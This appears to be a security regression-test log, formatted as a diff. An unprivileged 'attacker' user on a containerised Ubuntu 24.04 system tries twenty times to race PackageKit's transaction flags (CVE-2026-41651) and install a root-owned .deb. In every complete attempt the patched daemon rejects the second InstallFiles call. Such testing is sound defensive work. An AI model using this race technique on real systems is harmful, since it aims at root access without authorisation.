@@ -1,0 +1,617 @@
+PackageKit CVE-2026-41651 regression probe
+target=ubuntu24-server-lpe-target attacker=attacker attempts=20
+2026-05-16T12:12:50-0400
+
+$ docker exec ubuntu24-server-lpe-target bash -lc $'\nset -euo pipefail\necho "== baseline identity and package versions =="\nuname -a\nid attacker\nid selfauth || true\ndpkg-query -W -f="\\${Package}\\t\\${Version}\\t\\${Architecture}\\n" \\\n  packagekit packagekit-tools libpackagekit-glib2-18 python3-gi gir1.2-packagekitglib-1.0 polkitd dbus dbus-daemon systemd 2>&1 || true\necho\necho "== packagekit changelog head =="\nzcat /usr/share/doc/packagekit/changelog.Debian.gz | sed -n "1,18p"\necho\necho "== packagekit service =="\nsystemctl cat packagekit.service\necho\necho "== D-Bus socket and activation =="\nls -l /run/dbus/system_bus_socket /var/run/dbus/system_bus_socket 2>/dev/null || true\nbusctl --system list | grep -E "org.freedesktop.(PackageKit|PolicyKit1|DBus)|polkit" || true\necho\necho "== attacker CreateTransaction reachability =="\ntx=$(runuser -u attacker -- gdbus call --system \\\n  --dest org.freedesktop.PackageKit \\\n  --object-path /org/freedesktop/PackageKit \\\n  --method org.freedesktop.PackageKit.CreateTransaction |\n  sed -n "s/.*objectpath \'\\([^\' ]*\\)\'.*/\\1/p")\necho "attacker_tx=$tx"\nrunuser -u attacker -- gdbus introspect --system \\\n  --dest org.freedesktop.PackageKit \\\n  --object-path "$tx" |\n  sed -n "/interface org.freedesktop.PackageKit.Transaction/,/properties:/p"\nrunuser -u attacker -- gdbus call --system \\\n  --dest org.freedesktop.PackageKit \\\n  --object-path "$tx" \\\n  --method org.freedesktop.DBus.Properties.GetAll \\\n  org.freedesktop.PackageKit.Transaction\n'
+== baseline identity and package versions ==
+Linux 4f5b414436ae 6.10.14-linuxkit #1 SMP Sat May 17 08:28:57 UTC 2025 aarch64 aarch64 aarch64 GNU/Linux
+uid=1001(attacker) gid=1001(attacker) groups=1001(attacker)
+uid=1002(selfauth) gid=1002(selfauth) groups=1002(selfauth)
+dbus	1.14.10-4ubuntu4.1	arm64
+dbus-daemon	1.14.10-4ubuntu4.1	arm64
+gir1.2-packagekitglib-1.0	1.2.8-2ubuntu1.5	arm64
+libpackagekit-glib2-18	1.2.8-2ubuntu1.5	arm64
+packagekit	1.2.8-2ubuntu1.5	arm64
+packagekit-tools	1.2.8-2ubuntu1.5	arm64
+polkitd	124-2ubuntu1.24.04.3	arm64
+python3-gi	3.48.2-1	arm64
+systemd	255.4-1ubuntu8.15	arm64
+
+== packagekit changelog head ==
+packagekit (1.2.8-2ubuntu1.5) noble-security; urgency=medium
+
+  * SECURITY UPDATE: TOCTOU Race on Transaction Flags (LP: #2148512)
+    - debian/patches/Do-not-allow-re-invoking-methods-on-non-new-txn.patch:
+      do not allow re-invoking methods on non-new transactions in
+      src/pk-transaction.c.
+    - CVE number pending
+
+ -- Marc Deslauriers <marc.deslauriers@ubuntu.com>  Mon, 20 Apr 2026 08:20:57 -0400
+
+packagekit (1.2.8-2ubuntu1.4) noble; urgency=medium
+
+  * d/p/apt-Handle-gstreamer-64bit-suffix-on-any-architecture.patch:
+    Fix matching GStreamer capabilities on ARM64 and other architectures
+    (LP: #2060730)
+
+ -- Alessandro Astone <alessandro.astone@canonical.com>  Thu, 09 Oct 2025 11:00:52 +0200
+
+
+== packagekit service ==
+# /usr/lib/systemd/system/packagekit.service
+[Unit]
+Description=PackageKit Daemon
+# PK doesn't know how to do anything on ostree-managed systems;
+# currently the design is to have dedicated daemons like
+# eos-updater and rpm-ostree, and gnome-software talks to those.
+ConditionPathExists=!/run/ostree-booted
+Wants=network-online.target
+
+[Service]
+Type=dbus
+BusName=org.freedesktop.PackageKit
+User=root
+ExecStart=/usr/libexec/packagekitd
+
+== D-Bus socket and activation ==
+srw-rw-rw- 1 root root 0 May 16 15:18 /run/dbus/system_bus_socket
+srw-rw-rw- 1 root root 0 May 16 15:18 /var/run/dbus/system_bus_socket
+:1.4                            258 polkitd         polkitd         :1.4          polkit.service              -       -
+org.freedesktop.DBus              1 systemd         root            -             init.scope                  -       -
+org.freedesktop.PackageKit     9853 packagekitd     root            :1.388        packagekit.service          -       -
+org.freedesktop.PolicyKit1      258 polkitd         polkitd         :1.4          polkit.service              -       -
+
+== attacker CreateTransaction reachability ==
+attacker_tx=/6_bdcbbacb
+  interface org.freedesktop.PackageKit.Transaction {
+    methods:
+      @org.freedesktop.DBus.GLib.Async("")
+      SetHints(in  as hints);
+      @org.freedesktop.DBus.GLib.Async("")
+      AcceptEula(in  s eula_id);
+      @org.freedesktop.DBus.GLib.Async("")
+      Cancel();
+      @org.freedesktop.DBus.GLib.Async("")
+      DownloadPackages(in  b store_in_cache,
+                       in  as package_ids);
+      @org.freedesktop.DBus.GLib.Async("")
+      GetCategories();
+      @org.freedesktop.DBus.GLib.Async("")
+      DependsOn(in  t filter,
+                in  as package_ids,
+                in  b recursive);
+      @org.freedesktop.DBus.GLib.Async("")
+      GetDetails(in  as package_ids);
+      @org.freedesktop.DBus.GLib.Async("")
+      GetDetailsLocal(in  as files);
+      @org.freedesktop.DBus.GLib.Async("")
+      GetFilesLocal(in  as files);
+      @org.freedesktop.DBus.GLib.Async("")
+      GetFiles(in  as package_ids);
+      GetOldTransactions(in  u number);
+      @org.freedesktop.DBus.GLib.Async("")
+      GetPackages(in  t filter);
+      @org.freedesktop.DBus.GLib.Async("")
+      GetRepoList(in  t filter);
+      @org.freedesktop.DBus.GLib.Async("")
+      RequiredBy(in  t filter,
+                 in  as package_ids,
+                 in  b recursive);
+      @org.freedesktop.DBus.GLib.Async("")
+      GetUpdateDetail(in  as package_ids);
+      @org.freedesktop.DBus.GLib.Async("")
+      GetUpdates(in  t filter);
+      @org.freedesktop.DBus.GLib.Async("")
+      GetDistroUpgrades();
+      @org.freedesktop.DBus.GLib.Async("")
+      InstallFiles(in  t transaction_flags,
+                   in  as full_paths);
+      @org.freedesktop.DBus.GLib.Async("")
+      InstallPackages(in  t transaction_flags,
+                      in  as package_ids);
+      @org.freedesktop.DBus.GLib.Async("")
+      InstallSignature(in  u sig_type,
+                       in  s key_id,
+                       in  s package_id);
+      @org.freedesktop.DBus.GLib.Async("")
+      RefreshCache(in  b force);
+      @org.freedesktop.DBus.GLib.Async("")
+      RemovePackages(in  t transaction_flags,
+                     in  as package_ids,
+                     in  b allow_deps,
+                     in  b autoremove);
+      @org.freedesktop.DBus.GLib.Async("")
+      RepoEnable(in  s repo_id,
+                 in  b enabled);
+      @org.freedesktop.DBus.GLib.Async("")
+      RepoSetData(in  s repo_id,
+                  in  s parameter,
+                  in  s value);
+      @org.freedesktop.DBus.GLib.Async("")
+      RepoRemove(in  t transaction_flags,
+                 in  s repo_id,
+                 in  b autoremove);
+      @org.freedesktop.DBus.GLib.Async("")
+      Resolve(in  t filter,
+              in  as packages);
+      @org.freedesktop.DBus.GLib.Async("")
+      SearchDetails(in  t filter,
+                    in  as values);
+      @org.freedesktop.DBus.GLib.Async("")
+      SearchFiles(in  t filter,
+                  in  as values);
+      @org.freedesktop.DBus.GLib.Async("")
+      SearchGroups(in  t filter,
+                   in  as values);
+      @org.freedesktop.DBus.GLib.Async("")
+      SearchNames(in  t filter,
+                  in  as values);
+      @org.freedesktop.DBus.GLib.Async("")
+      UpdatePackages(in  t transaction_flags,
+                     in  as package_ids);
+      @org.freedesktop.DBus.GLib.Async("")
+      WhatProvides(in  t filter,
+                   in  as values);
+      @org.freedesktop.DBus.GLib.Async("")
+      UpgradeSystem(in  t transaction_flags,
+                    in  s distro_id,
+                    in  u upgrade_kind);
+      @org.freedesktop.DBus.GLib.Async("")
+      RepairSystem(in  t transaction_flags);
+    signals:
+      Category(s parent_id,
+               s cat_id,
+               s name,
+               s summary,
+               s icon);
+      @org.qtproject.QtDBus.QtTypeName.Out0("QVariantMap")
+      Details(a{sv} data);
+      ErrorCode(u code,
+                s details);
+      Files(s package_id,
+            as file_list);
+      Finished(u exit,
+               u runtime);
+      Package(u info,
+              s package_id,
+              s summary);
+      @org.qtproject.QtDBus.QtTypeName.Out0("QVariantList")
+      Packages(a(uss) packages);
+      RepoDetail(s repo_id,
+                 s description,
+                 b enabled);
+      RepoSignatureRequired(s package_id,
+                            s repository_name,
+                            s key_url,
+                            s key_userid,
+                            s key_id,
+                            s key_fingerprint,
+                            s key_timestamp,
+                            u type);
+      EulaRequired(s eula_id,
+                   s package_id,
+                   s vendor_name,
+                   s license_agreement);
+      MediaChangeRequired(u media_type,
+                          s media_id,
+                          s media_text);
+      RequireRestart(u type,
+                     s package_id);
+      Transaction(o object_path,
+                  s timespec,
+                  b succeeded,
+                  u role,
+                  u duration,
+                  s data,
+                  u uid,
+                  s cmdline);
+      UpdateDetail(s package_id,
+                   as updates,
+                   as obsoletes,
+                   as vendor_urls,
+                   as bugzilla_urls,
+                   as cve_urls,
+                   u restart,
+                   s update_text,
+                   s changelog,
+                   u state,
+                   s issued,
+                   s updated);
+      @org.qtproject.QtDBus.QtTypeName.Out0("QVariantList")
+      UpdateDetails(a(sasasasasasussuss) details);
+      DistroUpgrade(u type,
+                    s name,
+                    s summary);
+      ItemProgress(s id,
+                   u status,
+                   u percentage);
+      Destroy();
+    properties:
+({'Role': <uint32 0>, 'Status': <uint32 1>, 'LastPackage': <''>, 'Uid': <uint32 1001>, 'Sender': <':1.438'>, 'Percentage': <uint32 101>, 'AllowCancel': <true>, 'CallerActive': <false>, 'ElapsedTime': <uint32 0>, 'RemainingTime': <uint32 0>, 'Speed': <uint32 0>, 'DownloadSizeRemaining': <uint64 0>, 'TransactionFlags': <uint64 0>},)
+
+$ docker exec ubuntu24-server-lpe-target bash -lc $'\nset -euo pipefail\necho "== cleanup before probe =="\npkill -TERM -u attacker -f pk41651_gi_probe.py 2>/dev/null || true\ndpkg -r packagekit-cve41651-root 2>/dev/null || true\nrm -rf /tmp/packagekit-cve41651 /root/packagekit_cve41651_root\n'
+== cleanup before probe ==
+
+$ docker exec -i ubuntu24-server-lpe-target runuser -u attacker -- bash
+dpkg-deb: building package 'packagekit-cve41651-root' in '/tmp/packagekit-cve41651/packagekit-cve41651-root.deb'.
+-rw-r--r-- 1 attacker attacker 744 May 16 16:12 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+ new Debian package, version 2.0.
+ size 744 bytes: control archive=371 bytes.
+     204 bytes,     7 lines      control
+     179 bytes,    10 lines   *  postinst             #!/bin/sh
+ Package: packagekit-cve41651-root
+ Version: 1.0
+ Section: misc
+ Priority: optional
+ Architecture: all
+ Maintainer: Regression Probe <root@example.invalid>
+ Description: CVE-2026-41651 regression marker package
+
+$ docker exec -i ubuntu24-server-lpe-target runuser -u attacker -- bash
+[attempt 1] create transaction
+  tx=/7_abcdeabe
+  properties={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
+  SetHints interactive=true: ok
+  queue InstallFiles flags=8 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  queue InstallFiles flags=0 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  method_reply flags=8: ok
+  method_reply flags=0: GDBus.Error:org.freedesktop.PackageKit.Transaction.InvalidState: cannot call InstallFiles on transaction /7_abcdeabe: already in state running
+  signal path=/7_abcdeabe Package (10, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/7_abcdeabe ItemProgress ('packagekit-cve41651-root;1.0;all;+manual:local', 8, 0)
+  signal path=/7_abcdeabe Package (18, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/7_abcdeabe Finished (1, 26)
+[attempt 2] create transaction
+  tx=/8_bdcbaaec
+  properties={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
+  SetHints interactive=true: ok
+  queue InstallFiles flags=8 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  queue InstallFiles flags=0 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  method_reply flags=8: ok
+  method_reply flags=0: GDBus.Error:org.freedesktop.PackageKit.Transaction.InvalidState: cannot call InstallFiles on transaction /8_bdcbaaec: already in state running
+  signal path=/8_bdcbaaec Package (10, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/8_bdcbaaec ItemProgress ('packagekit-cve41651-root;1.0;all;+manual:local', 8, 0)
+  signal path=/8_bdcbaaec Package (18, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/8_bdcbaaec Finished (1, 22)
+[attempt 3] create transaction
+  tx=/9_ddceeeda
+  properties={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
+  SetHints interactive=true: ok
+  queue InstallFiles flags=8 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  queue InstallFiles flags=0 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  method_reply flags=8: ok
+  method_reply flags=0: GDBus.Error:org.freedesktop.PackageKit.Transaction.InvalidState: cannot call InstallFiles on transaction /9_ddceeeda: already in state running
+  signal path=/9_ddceeeda Package (10, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/9_ddceeeda ItemProgress ('packagekit-cve41651-root;1.0;all;+manual:local', 8, 0)
+  signal path=/9_ddceeeda Package (18, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/9_ddceeeda Finished (1, 20)
+[attempt 4] create transaction
+  tx=/10_ebcdadee
+  properties={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
+  SetHints interactive=true: ok
+  queue InstallFiles flags=8 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  queue InstallFiles flags=0 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  method_reply flags=8: ok
+  method_reply flags=0: GDBus.Error:org.freedesktop.PackageKit.Transaction.InvalidState: cannot call InstallFiles on transaction /10_ebcdadee: already in state running
+  signal path=/10_ebcdadee Package (10, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/10_ebcdadee ItemProgress ('packagekit-cve41651-root;1.0;all;+manual:local', 8, 0)
+  signal path=/10_ebcdadee Package (18, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/10_ebcdadee Finished (1, 22)
+[attempt 5] create transaction
+  tx=/11_abdeeaea
+  properties={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
+  SetHints interactive=true: ok
+  queue InstallFiles flags=8 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  queue InstallFiles flags=0 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  method_reply flags=8: ok
+  method_reply flags=0: GDBus.Error:org.freedesktop.PackageKit.Transaction.InvalidState: cannot call InstallFiles on transaction /11_abdeeaea: already in state running
+  signal path=/11_abdeeaea Package (10, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/11_abdeeaea ItemProgress ('packagekit-cve41651-root;1.0;all;+manual:local', 8, 0)
+  signal path=/11_abdeeaea Package (18, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/11_abdeeaea Finished (1, 20)
+[attempt 6] create transaction
+  tx=/12_aaeaccea
+  properties={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
+  SetHints interactive=true: ok
+  queue InstallFiles flags=8 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  queue InstallFiles flags=0 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  method_reply flags=8: ok
+  method_reply flags=0: GDBus.Error:org.freedesktop.PackageKit.Transaction.InvalidState: cannot call InstallFiles on transaction /12_aaeaccea: already in state running
+  signal path=/12_aaeaccea Package (10, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/12_aaeaccea ItemProgress ('packagekit-cve41651-root;1.0;all;+manual:local', 8, 0)
+  signal path=/12_aaeaccea Package (18, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/12_aaeaccea Finished (1, 20)
+[attempt 7] create transaction
+  tx=/13_ceaedcce
+  properties={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
+  SetHints interactive=true: ok
+  queue InstallFiles flags=8 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  queue InstallFiles flags=0 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  method_reply flags=8: ok
+  method_reply flags=0: GDBus.Error:org.freedesktop.PackageKit.Transaction.InvalidState: cannot call InstallFiles on transaction /13_ceaedcce: already in state running
+  signal path=/13_ceaedcce Package (10, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/13_ceaedcce ItemProgress ('packagekit-cve41651-root;1.0;all;+manual:local', 8, 0)
+  signal path=/13_ceaedcce Package (18, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/13_ceaedcce Finished (1, 19)
+[attempt 8] create transaction
+  tx=/14_aaeaeadd
+  properties={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
+  SetHints interactive=true: ok
+  queue InstallFiles flags=8 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  queue InstallFiles flags=0 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  method_reply flags=8: ok
+  method_reply flags=0: GDBus.Error:org.freedesktop.PackageKit.Transaction.InvalidState: cannot call InstallFiles on transaction /14_aaeaeadd: already in state running
+  signal path=/14_aaeaeadd Package (10, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/14_aaeaeadd ItemProgress ('packagekit-cve41651-root;1.0;all;+manual:local', 8, 0)
+  signal path=/14_aaeaeadd Package (18, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/14_aaeaeadd Finished (1, 21)
+[attempt 9] create transaction
+  tx=/15_bedcdeeb
+  properties={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
+  SetHints interactive=true: ok
+  queue InstallFiles flags=8 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  queue InstallFiles flags=0 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  method_reply flags=8: ok
+  method_reply flags=0: GDBus.Error:org.freedesktop.PackageKit.Transaction.InvalidState: cannot call InstallFiles on transaction /15_bedcdeeb: already in state running
+  signal path=/15_bedcdeeb Package (10, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/15_bedcdeeb ItemProgress ('packagekit-cve41651-root;1.0;all;+manual:local', 8, 0)
+  signal path=/15_bedcdeeb Package (18, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/15_bedcdeeb Finished (1, 25)
+[attempt 10] create transaction
+  tx=/16_caadabab
+  properties={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
+  SetHints interactive=true: ok
+  queue InstallFiles flags=8 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  queue InstallFiles flags=0 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  method_reply flags=8: ok
+  method_reply flags=0: GDBus.Error:org.freedesktop.PackageKit.Transaction.InvalidState: cannot call InstallFiles on transaction /16_caadabab: already in state running
+  signal path=/16_caadabab Package (10, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/16_caadabab ItemProgress ('packagekit-cve41651-root;1.0;all;+manual:local', 8, 0)
+  signal path=/16_caadabab Package (18, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/16_caadabab Finished (1, 21)
+[attempt 11] create transaction
+  tx=/17_addbeaed
+  properties={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
+  SetHints interactive=true: ok
+  queue InstallFiles flags=8 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  queue InstallFiles flags=0 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  method_reply flags=8: ok
+  method_reply flags=0: GDBus.Error:org.freedesktop.PackageKit.Transaction.InvalidState: cannot call InstallFiles on transaction /17_addbeaed: already in state running
+  signal path=/17_addbeaed Package (10, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/17_addbeaed ItemProgress ('packagekit-cve41651-root;1.0;all;+manual:local', 8, 0)
+  signal path=/17_addbeaed Package (18, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/17_addbeaed Finished (1, 28)
+[attempt 12] create transaction
+  tx=/18_abacceee
+  properties={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
+  SetHints interactive=true: ok
+  queue InstallFiles flags=8 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  queue InstallFiles flags=0 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  method_reply flags=8: ok
+  method_reply flags=0: GDBus.Error:org.freedesktop.PackageKit.Transaction.InvalidState: cannot call InstallFiles on transaction /18_abacceee: already in state running
+  signal path=/18_abacceee Package (10, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/18_abacceee ItemProgress ('packagekit-cve41651-root;1.0;all;+manual:local', 8, 0)
+  signal path=/18_abacceee Package (18, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/18_abacceee Finished (1, 23)
+[attempt 13] create transaction
+  tx=/19_bebaaabc
+  properties={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
+  SetHints interactive=true: ok
+  queue InstallFiles flags=8 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  queue InstallFiles flags=0 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  method_reply flags=8: ok
+  method_reply flags=0: GDBus.Error:org.freedesktop.PackageKit.Transaction.InvalidState: cannot call InstallFiles on transaction /19_bebaaabc: already in state running
+  signal path=/19_bebaaabc Package (10, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/19_bebaaabc ItemProgress ('packagekit-cve41651-root;1.0;all;+manual:local', 8, 0)
+  signal path=/19_bebaaabc Package (18, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/19_bebaaabc Finished (1, 21)
+[attempt 14] create transaction
+  tx=/20_acbcedca
+  properties={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
+  SetHints interactive=true: ok
+  queue InstallFiles flags=8 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  queue InstallFiles flags=0 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  method_reply flags=8: ok
+  method_reply flags=0: GDBus.Error:org.freedesktop.PackageKit.Transaction.InvalidState: cannot call InstallFiles on transaction /20_acbcedca: already in state running
+  signal path=/20_acbcedca Package (10, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/20_acbcedca ItemProgress ('packagekit-cve41651-root;1.0;all;+manual:local', 8, 0)
+  signal path=/20_acbcedca Package (18, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/20_acbcedca Finished (1, 20)
+[attempt 15] create transaction
+  tx=/21_dbcbecec
+  properties={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
+  SetHints interactive=true: ok
+  queue InstallFiles flags=8 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  queue InstallFiles flags=0 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  method_reply flags=8: ok
+  method_reply flags=0: GDBus.Error:org.freedesktop.PackageKit.Transaction.InvalidState: cannot call InstallFiles on transaction /21_dbcbecec: already in state running
+  signal path=/21_dbcbecec Package (10, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/21_dbcbecec ItemProgress ('packagekit-cve41651-root;1.0;all;+manual:local', 8, 0)
+  signal path=/21_dbcbecec Package (18, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/21_dbcbecec Finished (1, 26)
+[attempt 16] create transaction
+  tx=/22_abcdcdec
+  properties={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
+  SetHints interactive=true: ok
+  queue InstallFiles flags=8 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  queue InstallFiles flags=0 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  method_reply flags=8: ok
+  method_reply flags=0: GDBus.Error:org.freedesktop.PackageKit.Transaction.InvalidState: cannot call InstallFiles on transaction /22_abcdcdec: already in state running
+  signal path=/22_abcdcdec Package (10, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/22_abcdcdec ItemProgress ('packagekit-cve41651-root;1.0;all;+manual:local', 8, 0)
+  signal path=/22_abcdcdec Package (18, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/22_abcdcdec Finished (1, 20)
+[attempt 17] create transaction
+  tx=/23_daabbdeb
+  properties={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
+  SetHints interactive=true: ok
+  queue InstallFiles flags=8 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  queue InstallFiles flags=0 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  method_reply flags=8: ok
+  method_reply flags=0: GDBus.Error:org.freedesktop.PackageKit.Transaction.InvalidState: cannot call InstallFiles on transaction /23_daabbdeb: already in state running
+  signal path=/23_daabbdeb Package (10, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/23_daabbdeb ItemProgress ('packagekit-cve41651-root;1.0;all;+manual:local', 8, 0)
+  signal path=/23_daabbdeb Package (18, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/23_daabbdeb Finished (1, 21)
+[attempt 18] create transaction
+  tx=/24_acebebec
+  properties={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
+  SetHints interactive=true: ok
+  queue InstallFiles flags=8 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  queue InstallFiles flags=0 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  method_reply flags=8: ok
+  method_reply flags=0: GDBus.Error:org.freedesktop.PackageKit.Transaction.InvalidState: cannot call InstallFiles on transaction /24_acebebec: already in state running
+  signal path=/24_acebebec Package (10, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/24_acebebec ItemProgress ('packagekit-cve41651-root;1.0;all;+manual:local', 8, 0)
+  signal path=/24_acebebec Package (18, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/24_acebebec Finished (1, 20)
+[attempt 19] create transaction
+  tx=/25_bcdcaade
+  properties={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
+  SetHints interactive=true: ok
+  queue InstallFiles flags=8 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  queue InstallFiles flags=0 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  method_reply flags=8: ok
+  method_reply flags=0: GDBus.Error:org.freedesktop.PackageKit.Transaction.InvalidState: cannot call InstallFiles on transaction /25_bcdcaade: already in state running
+  signal path=/25_bcdcaade Package (10, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/25_bcdcaade ItemProgress ('packagekit-cve41651-root;1.0;all;+manual:local', 8, 0)
+  signal path=/25_bcdcaade Package (18, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/25_bcdcaade Finished (1, 23)
+[attempt 20] create transaction
+  tx=/26_dbaceeea
+  properties={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
+  SetHints interactive=true: ok
+  queue InstallFiles flags=8 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  queue InstallFiles flags=0 /tmp/packagekit-cve41651/packagekit-cve41651-root.deb
+  method_reply flags=8: ok
+  method_reply flags=0: GDBus.Error:org.freedesktop.PackageKit.Transaction.InvalidState: cannot call InstallFiles on transaction /26_dbaceeea: already in state running
+  signal path=/26_dbaceeea Package (10, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
+  signal path=/26_dbaceeea ItemProgress ('packagekit-cve41651-root;1.0;all;+manual:local', 8, 0)
+  signal path=/26_dbaceeea Package (18, 'packagekit-cve41651-root;1.0;all;+manual:local', 'CVE-2026-41651 regression marker package')
